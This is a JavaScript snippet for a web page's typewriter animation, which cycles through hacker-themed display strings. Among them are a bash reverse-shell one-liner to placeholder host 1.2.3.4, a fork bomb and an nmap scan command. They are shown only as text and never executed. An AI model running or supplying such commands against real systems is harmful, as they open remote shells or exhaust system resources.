function startTypingEffect(el, messages) {
  let messageIndex = 0;
  let charIndex = 0;
  let isDeleting = false;

  const typingSpeed = 100;
  const deletingSpeed = 20;
  const delayBetween = 2000;

  function type() {
    const currentMessage = messages[messageIndex];
    const visibleText = currentMessage.substring(0, charIndex);
    el.textContent = visibleText;

    if (!isDeleting && charIndex < currentMessage.length) {
      charIndex++;
      setTimeout(type, typingSpeed);
    } else if (isDeleting && charIndex > 0) {
      charIndex--;
      setTimeout(type, deletingSpeed);
    } else {
      setTimeout(() => {
        isDeleting = !isDeleting;
        if (!isDeleting) {
          messageIndex = (messageIndex + 1) % messages.length;
        }
        type();
      }, delayBetween);
    }
  }
  type();
}

document.addEventListener("DOMContentLoaded", () => {
  const interval = setInterval(() => {
    const el = document.getElementById("typewriter");
    if (el) {
      clearInterval(interval);
      startTypingEffect(el, [
        "sh -i >& /dev/tcp/1.2.3.4/1337 0>&1",
        ":(){:|:&}:;",
        "nmap -sV -sC 1.2.3.4",
        "G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤G̭̺̙͔̦̖̭E̞̫͙T͕͇O̝̗̯̖͍͙̬͎U̲͎͕̳͓̱̖̯T̤",
      ]);
    }
  }, 100);
});
